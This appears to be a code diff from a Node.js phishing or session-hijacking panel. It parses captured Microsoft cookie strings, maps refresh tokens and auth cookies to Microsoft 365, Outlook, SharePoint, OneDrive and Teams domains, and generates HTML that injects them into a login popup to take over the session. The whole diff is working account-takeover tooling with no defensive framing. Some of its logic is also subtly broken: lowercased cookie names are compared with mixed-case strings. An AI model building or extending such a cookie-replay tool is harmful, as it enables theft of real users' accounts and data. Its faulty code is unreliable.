@@ -169,8 +169,17 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
 });
 
 // ─── Parse cookie string into array of cookie objects ───────────────
-function parseCookies(cookieString) {
+// Enhanced: Supports tenant and account type for proper domain handling
+function parseCookies(cookieString, options) {
   if (!cookieString) return [];
+
+  options = options || {};
+  var tenant = options.tenant || 'common';
+  var accountType = options.accountType || 'unknown';
+
+  // Build domain map for proper cookie domain assignment
+  var domainMap = buildCookieDomainMap(tenant, accountType);
+
   var seenNames = {};
   var pairs = cookieString.split(';').filter(function(c) { return c.trim(); });
 
@@ -185,15 +194,18 @@ function parseCookies(cookieString) {
       // Skip cookie attributes and their values
       if (nameLower === 'expires' || nameLower === 'max-age' || nameLower === 'domain' ||
           nameLower === 'path' || nameLower === 'secure' || nameLower === 'httponly' ||
-          nameLower.startsWith('samesite=')) {
+          nameLower === 'samesite' || nameLower === 'partitioned') {
         continue;
       }
 
       // Skip empty values
       if (!value || value.length === 0) continue;
 
+      // Assign proper domain based on cookie name
+      var assignedDomain = domainMap.getDomain(name);
+
       // Store unique cookies by lowercase name (last occurrence wins)
-      seenNames[nameLower] = { name: name, value: value, domain: '.login.microsoftonline.com' };
+      seenNames[nameLower] = { name: name, value: value, domain: assignedDomain };
     }
   }
 
@@ -205,6 +217,68 @@ function parseCookies(cookieString) {
     }
   }
   return cookies;
+}
+
+// ─── Build Cookie Domain Map ───────────────────────────────────────
+function buildCookieDomainMap(tenant, accountType) {
+  var domainMap = {
+    _getDomain: function(cookieName) {
+      var nameLower = cookieName.toLowerCase();
+
+      // Personal account (MSA) domains
+      if (accountType === 'personal') {
+        if (nameLower === 'x-ms-RefreshTokenCredential' || nameLower === 'RefreshToken') {
+          return '.login.live.com';
+        }
+        if (nameLower.indexOf('mscc') !== -1 || nameLower.indexOf('CRSLST') !== -1 ||
+            nameLower.indexOf('STSSVC') !== -1 || nameLower.indexOf('wgctx') !== -1) {
+          return '.login.live.com';
+        }
+        return '.login.live.com';
+      }
+
+      // Work/School account domains
+      if (nameLower === 'x-ms-RefreshTokenCredential' || nameLower === 'RefreshToken' ||
+          nameLower === 'pst' || nameLower === 'esx' || nameLower === 'gtmk' ||
+          nameLower === 'es' || nameLower === 'pplms') {
+        return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
+      }
+      if (nameLower === 'SCAuth' || nameLower === 'SigninChallenge' ||
+          nameLower === 'AccountAuthCookie' || nameLower === 'AMLBGen') {
+        return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
+      }
+      if (nameLower.indexOf('x-ms') !== -1 || nameLower.indexOf('msauth') !== -1) {
+        return '.login.microsoftonline.com';
+      }
+      if (nameLower === '_oacl' || nameLower === '_rcid' || nameLower === 'RUpdT' ||
+          nameLower === 'MCLRC' || nameLower === 'wssbLocation') {
+        return '.office.com';
+      }
+      if (nameLower === 'WAAf' || nameLower === 'MSSWFS' || nameLower === 'RSTT' ||
+          nameLower.indexOf('onedrive') !== -1) {
+        return '.onedrive.live.com';
+      }
+      if (nameLower === 'ClientInfo' || nameLower === 'ExAuthCookie' ||
+          nameLower.indexOf('outlook') !== -1) {
+        return '.outlook.office365.com';
+      }
+      if (nameLower === 'SPOIDCRL' || nameLower === 'SPOExtensionSDK' ||
+          nameLower.indexOf('sharepoint') !== -1) {
+        return '.sharepoint.com';
+      }
+      if (nameLower === 'TEAMSSESSION' || nameLower.indexOf('teams') !== -1) {
+        return '.teams.microsoft.com';
+      }
+
+      // Default fallback
+      if (accountType === 'personal') return '.login.live.com';
+      return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
+    },
+    getDomain: function(cookieName) {
+      return this._getDomain(cookieName);
+    }
+  };
+  return domainMap;
 }
 
 // ─── PROPER METHOD: Opens popup to Microsoft login, injects cookies ─
@@ -261,59 +335,53 @@ function generateStandaloneHtml(cookies) {
   html += ' var statusDiv = document.getElementById("status");\n';
   html += '\n';
   html += ' function setStatus(msg, type) {\n';
-  html += ' statusDiv.className = "status " + type;\n';
-  html += ' statusDiv.innerHTML = msg;\n';
+  html += '   statusDiv.className = "status " + type;\n';
+  html += '   statusDiv.innerHTML = msg;\n';
+  html += ' }\n';
   html += '\n';
   html += ' function injectCookies() {\n';
-  html += ' setStatus("Opening popup...", "success");\n';
+  html += '   setStatus("Opening popup...", "success");\n';
   html += '\n';
-  html += ' var popup = window.open(\n';
-  html += ' "https://login.microsoftonline.com/common/oauth2/authorize",\n';
-  html += ' "vgenius_inject",\n';
-  html += ' "width=800,height=600,scrollbars=yes"\n';
-  html += ' );\n';
+  html += '   var popup = window.open(\n';
+  html += '     "https://login.microsoftonline.com/common/oauth2/authorize",\n';
+  html += '     "vgenius_inject",\n';
+  html += '     "width=800,height=600,scrollbars=yes"\n';
+  html += '   );\n';
   html += '\n';
-  html += ' if (!popup) {\n';
-  html += ' setStatus("Popup blocked! Please allow popups for this site.", "error");\n';
-  html += ' return;\n';
-  html += ' }\n';
+  html += '   if (!popup) {\n';
+  html += '     setStatus("Popup blocked! Please allow popups for this site.", "error");\n';
+  html += '     return;\n';
+  html += '   }\n';
   html += '\n';
-  html += ' // Wait 2 seconds for popup to load, then inject\n';
-  html += ' setTimeout(function() {\n';
-  html += ' try {\n';
-  html += ' var popupDoc = popup.document;\n';
+  html += '   // Wait 3 seconds for popup to load, then inject\n';
+  html += '   setTimeout(function() {\n';
+  html += '     try {\n';
+  html += '       var popupDoc = popup.document;\n';
   html += '\n';
-  html += ' // Set each cookie directly on the popup document\n';
-  html += ' for (var i = 0; i < cookies.length; i++) {\n';
-  html += ' var c = cookies[i];\n';
-  html += ' var domain = c.domain || ".login.microsoftonline.com";\n';
-  html += ' var cookieVal = encodeURIComponent(c.value);\n';
-  html += ' var setCookie = c.name + "=" + cookieVal;\n';
-  html += ' setCookie += "; domain=" + domain;\n';
-  html += ' setCookie += "; path=/";\n';
-  html += ' setCookie += "; SameSite=None";\n';
-  html += ' setCookie += "; Secure";\n';
-  html += ' setCookie += "; expires=" + expStr;\n';
+  html += '       // Set each cookie directly on the popup document\n';
+  html += '       for (var i = 0; i < cookies.length; i++) {\n';
+  html += '         var c = cookies[i];\n';
+  html += '         var domain = c.domain || ".login.microsoftonline.com";\n';
+  html += '         var cookieVal = encodeURIComponent(c.value);\n';
+  html += '         var setCookie = c.name + "=" + cookieVal;\n';
+  html += '         setCookie += "; domain=" + domain;\n';
+  html += '         setCookie += "; path=/";\n';
+  html += '         setCookie += "; SameSite=None";\n';
+  html += '         setCookie += "; Secure";\n';
   html += '\n';
-  html += ' popupDoc.cookie = setCookie;\n';
-  html += ' }\n';
+  html += '         popupDoc.cookie = setCookie;\n';
+  html += '       }\n';
   html += '\n';
-  html += ' // Verify cookies were set\n';
-  html += ' var allCookies = popupDoc.cookie;\n';
-  html += ' setStatus("Injected ' + cookies.length + ' cookies! Redirecting to Microsoft login...", "success");\n';
+  html += '       // Verify cookies were set\n';
+  html += '       setStatus("Injected ' + cookies.length + ' cookies! Redirecting...", "success");\n';
   html += '\n';
-  html += ' // Now redirect to trigger authentication\n';
-  html += ' popup.location.href = "https://login.microsoftonline.com/?auth=2";\n';
+  html += '       // Now redirect to trigger authentication\n';
+  html += '       popup.location.href = "https://www.office.com/";\n';
   html += '\n';
-  html += ' // Close popup after redirect is initiated\n';
-  html += ' setTimeout(function() {\n';
-  html += ' if (popup && !popup.closed) popup.close();\n';
-  html += ' }, 3000);\n';
-  html += '\n';
-  html += ' } catch(e) {\n';
-  html += ' setStatus("Error: " + e.message, "error");\n';
-  html += ' if (popup && !popup.closed) popup.close();\n';
-  html += ' }, 2000);\n';
+  html += '     } catch(e) {\n';
+  html += '       setStatus("Error: " + e.message, "error");\n';
+  html += '     }\n';
+  html += '   }, 3000);\n';
   html += ' }\n';
   html += ' </script>\n';
   html += '</body></html>';
